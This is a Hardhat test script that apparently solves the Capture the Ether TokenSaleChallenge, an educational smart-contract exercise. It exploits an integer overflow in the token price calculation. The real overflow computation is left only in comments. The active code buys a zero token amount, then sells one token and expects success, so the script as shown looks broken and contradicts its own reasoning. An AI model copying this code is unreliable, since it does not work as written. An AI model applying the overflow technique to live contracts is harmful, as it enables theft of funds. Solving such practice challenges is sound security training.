import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
// import { formatEtherscanTx } from "../utils/format";

let accounts: Signer[];
let eoa: Signer;
let challengeContract: Contract;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const challengeFactory = await ethers.getContractFactory(
    "TokenSaleChallenge"
  );
  challengeContract = challengeFactory.attach(
    `0x56E9615787Fde82f3C68b572f68e2bC6C1866918`
  );
});

it("solves the challenge", async function () {

  const oneToken = BigNumber.from(1);
  const ONE_ETHER = BigNumber.from(`10`).pow(`18`);

  await challengeContract.buy(oneToken.div(ONE_ETHER), {
    value: oneToken.div(ONE_ETHER)
  });

  const balance: BigNumber = await challengeContract.balanceOf(await eoa.getAddress());
  console.log(`balance`, balance.toString());

  const tx = await challengeContract.sell(`1`);

  const isComplete = await challengeContract.isComplete();
  expect(isComplete).to.be.true;
  // we want an overflow in this line of the contract:
  // // uint256 = numTokens * 1 ether = numTokens * 10 ^ 18
  // // when x is the amount of tokens we will receive (input to buy)
  // // then we need to pay ceil(x / 10^18) * 10^18 mod 2^256 (overflow amount) in value
  // // try to minimize this payment value for x >= 2^256 (when overflow happens)
  // // not sure how to do it analytically, but we can just start with x = 2^256
  // // as 2^256 and 10^18 = (2*5)^18 = 2^18*5^18, multiplying by prime 3 should
  // // give us a good cycle to check for min value
  // const ONE_ETHER = BigNumber.from(`10`).pow(`18`);
  // const computePayment = (x: BigNumber) => {
  //   // there's a remainder that is cut off, need to increase division result by 1
  //   let toBuy = x.div(ONE_ETHER).add(`1`);
  //   let overflowRemainder = toBuy
  //     .mul(ONE_ETHER)
  //     .mod(BigNumber.from(`2`).pow(`256`));
  //   return { toBuy, toPay: overflowRemainder };
  // };
  // let MAX_UINT256 = BigNumber.from(`2`).pow(`256`);
  // let multiplier = BigNumber.from(`3`)
  // let bestPair: ReturnType<typeof computePayment> = {
  //   toBuy: BigNumber.from(`0`),
  //   toPay: BigNumber.from(ethers.utils.parseEther(`1`)),
  // };

  // // make sure toBuy = x / ONE_ETHER
  // while(true) {
  //   multiplier = multiplier.mul(`3`);
  //   const result = computePayment(MAX_UINT256.mul(multiplier))

  //   // make sure to buy still fits in uint256 for function call
  //   if(result.toBuy.gte(MAX_UINT256)) break;

  //   if(result.toPay.lt(bestPair.toPay)) {
  //     bestPair = result
  //   }
  //}

  // console.log(`buying`, bestPair.toBuy.toString());
  // console.log(`paying`, ethers.utils.formatEther(bestPair.toPay), `ETH`);

  // await challengeContract.buy(bestPair.toBuy.toString(), {
  //   value: bestPair.toPay.toString(),
  // });


});
